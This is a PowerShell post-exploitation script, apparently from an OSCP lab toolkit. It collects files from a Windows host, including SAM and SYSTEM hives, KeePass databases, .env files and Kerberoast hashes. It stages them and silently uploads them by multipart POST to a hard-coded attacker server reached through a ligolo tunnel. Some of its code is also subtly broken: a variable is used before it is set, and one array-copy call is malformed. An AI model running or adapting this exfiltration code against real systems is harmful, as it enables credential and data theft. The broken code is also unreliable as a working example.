# =============================================================================
# CUSTOM UPLOAD - Standalone Windows File Upload Tool
# =============================================================================
# 
# This PowerShell script uploads files from the current directory to a web server.
# It's designed to be run independently when you only need file uploads
# without the full system enumeration that slamit.ps1 provides.
# 
# =============================================================================

# Upload all the files in the current directory to the web server.

# $uri = "http://192.168.45.163:80";
$uri = "http://10.10.202.153:80" # set up a ligolo listener first!
$baseDir = "/home/kali/projects/oscp";
$mainDir = "challenges";
$proj = "oscp_c";
# $hn = [System.Net.Dns]::GetHostName();
$hn = "MS02"
$targetFolder = "$baseDir/$mainDir/$proj/$hn";

# Function to create centered section headers
function Write-SectionHeader {
    param([string]$Title)
    
    $width = 90
    $borderChar = "#"
    $paddingChar = " "
    
    # Top border
    Write-Host ($borderChar * $width) -ForegroundColor Cyan
    
    # Empty line
    $emptyLine = $borderChar + ($paddingChar * ($width - 2)) + $borderChar
    Write-Host $emptyLine -ForegroundColor Cyan
    
    # Centered header
    $innerWidth = $width - 2
    $textLen = $Title.Length
    $leftPad = [math]::Floor(($innerWidth - $textLen) / 2)
    $rightPad = $innerWidth - $textLen - $leftPad
    
    $headerLine = $borderChar + ($paddingChar * $leftPad) + $Title + ($paddingChar * $rightPad) + $borderChar
    Write-Host $headerLine -ForegroundColor Cyan
    
    # Empty line
    Write-Host $emptyLine -ForegroundColor Cyan
    
    # Bottom border
    Write-Host ($borderChar * $width) -ForegroundColor Cyan
    Write-Host ""
}

# Function to create centered completion messages
function Write-CompletionMessage {
    param([string]$Message)
    
    $width = 90
    $borderChar = "="
    $paddingChar = " "
    
    # Top border
    Write-Host ($borderChar * $width) -ForegroundColor Green
    
    # Centered message
    $innerWidth = $width - 2
    $textLen = $Message.Length
    $leftPad = [math]::Floor(($innerWidth - $textLen) / 2)
    $rightPad = $innerWidth - $textLen - $leftPad
    
    $messageLine = $borderChar + ($paddingChar * $leftPad) + $Message + ($paddingChar * $rightPad) + $borderChar
    Write-Host $messageLine -ForegroundColor Green
    
    # Bottom border
    Write-Host ($borderChar * $width) -ForegroundColor Green
    Write-Host ""
}

Write-SectionHeader "Custom Upload - File Discovery and Upload"

# Create a dedicated staging directory for discovered files
$stagingDir = Join-Path -Path $thisDir -ChildPath "SLAMIT_Custom_Upload_Files"
if (Test-Path $stagingDir) {
    Remove-Item -Path $stagingDir -Recurse -Force
}
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

Write-Host "Created staging directory: $stagingDir" -ForegroundColor Yellow

# File extensions to include (exclude .exe to avoid tool contamination)
$extensions = @(
    '*.txt','*.log','*.pdf','*.zip','*.doc','*.docx','*.xls','*.xlsx',
    '*.ppt','*.pptx','*.csv','*.ini','*.conf','*.cfg','*.env',
    '*.yaml','*.yml','*.json','*.xml','*.kdbx','*.rdp','*.7z','*.rar',
    '*.tar','*.gz','*.bak','*.old','*.tmp','*.db','*.sqlite','*.sqlite3',
    '*.mdb','*.accdb','*.rtf','*.md','*.hash','*.kerberoast'
)

# Special filenames to search explicitly
$specialFiles = @('SAM','SYSTEM')

# Comprehensive list of tools and scripts to exclude
$excludePatterns = @(
    "mimikatz*", "SharpHound*", "winPEAS*", "PowerView*", "PowerUp*", 
    "BloodHound*", "custom_upload*", "slamit*", "PsExec*", "Rubeus*", 
    "chisel*", "agent*", "*.ps1", "*.exe", "*.bat", "*.cmd"
)

$thisDir = (Split-Path -Path $MyInvocation.MyCommand.Path -Parent)  # Script's directory
Write-Host "Searching $thisDir for files..."

$allFiles = @()
$stagedFiles = @()

# Search by extensions (with filtering)
foreach ($ext in $extensions) {
    $found = Get-ChildItem -Path $thisDir -Recurse -Include $ext -File -ErrorAction SilentlyContinue
    if ($found) {
        # Filter out tool files and scripts
        $filteredFiles = $found | Where-Object { 
            $fileName = $_.Name.ToLower()
            $shouldExclude = $false
            foreach ($pattern in $excludePatterns) {
                if ($fileName -like $pattern.ToLower()) {
                    $shouldExclude = $true
                    break
                }
            }
            -not $shouldExclude
        }
        if ($filteredFiles) {
            $allFiles += $filteredFiles
        }
    }
}

# Search for specific files
foreach ($special in $specialFiles) {
    $found = Get-ChildItem -Path $thisDir -Recurse -Filter $special -ErrorAction SilentlyContinue
    if ($found) {
        $allFiles += $found
    }
}

Write-Host "Found $($allFiles.Count) interesting files" -ForegroundColor Green

# Stage files to the dedicated directory
foreach ($file in $allFiles) {
    try {
        # Create a unique filename to avoid conflicts
        $fileName = $file.Name
        $baseName = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
        $extension = [System.IO.Path]::GetExtension($fileName)
        
        # For system files like SAM/SYSTEM, include path info
        if ($fileName -match "^(SAM|SYSTEM)$") {
            $sanitizedPath = ($file.DirectoryName -replace "[:\\]", "_")
            $fileName = "$baseName`_$sanitizedPath$extension"
        }
        
        $targetPath = Join-Path -Path $stagingDir -ChildPath $fileName
        $counter = 1

        # Handle conflicts by adding -1, -2, etc.
        while (Test-Path $targetPath) {
            $targetPath = Join-Path -Path $stagingDir -ChildPath "$baseName-$counter$extension"
            $counter++
        }

        # Copy file to staging directory
        Copy-Item -Path $file.FullName -Destination $targetPath -ErrorAction Stop
        $stagedFiles += $targetPath
        Write-Host "Staged: $($file.Name) → $targetPath" -ForegroundColor Green
    }
    catch {
        Write-Warning "Failed to stage: $($file.FullName) — $_"
    }
}

Write-Host "Successfully staged $($stagedFiles.Count) files to: $stagingDir" -ForegroundColor Green

# Filter out the script itself
# $files = $allFiles | Where-Object { $_.FullName -ne $thisScript }

Write-Host "Starting upload of $($stagedFiles.Count) staged files..." -ForegroundColor Yellow

$uploadCount = 0
$successCount = 0
$failedCount = 0

foreach ($file in $stagedFiles) {
    $uploadCount++
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file)
        $boundary = [System.Guid]::NewGuid().ToString()
        $lf = "`r`n"
        $fileName = [System.IO.Path]::GetFileName($file)

        # Folder part
        $folderPart = "--$boundary$lf" +
                    "Content-Disposition: form-data; name=`"folder`"$lf$lf" +
                    "$targetFolder$lf"

        # File part
        $fileHeader = "--$boundary$lf" +
                    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$lf" +
                    "Content-Type: application/octet-stream$lf$lf"

        # Footer
        $footer = "$lf--$boundary--$lf"

        # Convert header strings to bytes
        $encoding = [System.Text.Encoding]::ASCII
        $folderBytes = $encoding.GetBytes($folderPart)
        $fileHeaderBytes = $encoding.GetBytes($fileHeader)
        $footerBytes = $encoding.GetBytes($footer)

        # Construct full body
        $bodyBytes = New-Object byte[] ($folderBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length + $footerBytes.Length)
        [System.Array]::Copy($folderBytes, 0, $bodyBytes, 0, $folderBytes.Length)
        [System.Array]::Copy($fileHeaderBytes, 0, $bodyBytes, $folderBytes.Length, $fileHeaderBytes.Length)
        [System.Array]::Copy($fileBytes, 0, $bodyBytes, $folderBytes.Length + $fileHeaderBytes.Length, $fileBytes.Length)
        [System.Array]::Copy($footerBytes, 0, $bodyBytes, $folderBytes.Length + $fileHeaderBytes.Length, $fileBytes.Length, $footerBytes.Length)

        # Upload using Invoke-WebRequest (silent)
        $null = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -ErrorAction SilentlyContinue
        $successCount++
    }
    catch {
        $failedCount++
    }
}

# Pretty print summary
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                              UPLOAD SUMMARY                                 ║" -ForegroundColor Cyan
Write-Host "╠══════════════════════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Total Files Processed: $($uploadCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor White
Write-Host "║  Successfully Uploaded: $($successCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor Green
Write-Host "║  Failed Uploads:        $($failedCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor Red
Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

Write-CompletionMessage "Custom Upload Complete"

# Cleanup staging directory
try {
    if (Test-Path $stagingDir) {
        Remove-Item -Path $stagingDir -Recurse -Force
        Write-Host "Cleaned up staging directory: $stagingDir" -ForegroundColor Green
    }
}
catch {
    Write-Warning "Failed to cleanup staging directory: $_"
}